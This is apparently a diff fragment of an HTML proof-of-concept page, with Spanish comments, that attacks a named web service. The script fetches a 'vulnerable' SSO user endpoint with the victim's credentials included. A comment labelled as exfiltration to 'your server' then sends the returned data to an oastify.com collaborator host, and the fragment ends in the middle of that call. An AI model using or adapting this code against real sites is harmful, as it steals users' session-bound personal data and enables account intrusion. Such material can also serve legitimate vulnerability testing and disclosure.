@@ -8,12 +8,12 @@
     <script>
       // Endpoint vulnerable que devuelve datos sensibles
       fetch("https://app.fing.com/rest/users/sso", {
-        method: "GET",
-        credentials: "include"
-      })
-      .then(res => res.text())
-      .then(data => {
-        console.log("Datos obtenidos:", data);
+  method: "GET",
+  credentials: "include"
+})
+.then(res => res.text())
+.then(data => console.log("✅ DATA:", data))
+.catch(err => console.error("❌ ERROR:", err));
 
         // Exfiltración a tu servidor
         fetch("https://aky3b8far5ksmy0lcr6h8e0suj0ao0cp.oastify.com/" /* o tu propio servidor */, {
